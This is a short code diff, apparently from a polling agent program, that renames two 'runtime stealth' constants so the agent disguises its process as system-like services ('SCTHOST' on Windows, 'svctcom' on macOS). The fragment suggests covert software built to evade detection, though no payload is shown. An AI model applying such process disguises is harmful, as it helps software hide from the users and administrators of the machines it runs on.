@@ -39,8 +39,8 @@ AGENT_VERSION = "1.1.0"
 POLL_SECONDS = 15
 
 # ── Runtime stealth ───────────────────────────────────────────────────────────
-_WIN_DISGUISE = "windowstelementoryservice"
-_MAC_DISGUISE = "macstelementoryservice"
+_WIN_DISGUISE = "SCTHOST"
+_MAC_DISGUISE = "svctcom"
 
 
 def _apply_stealth() -> None:
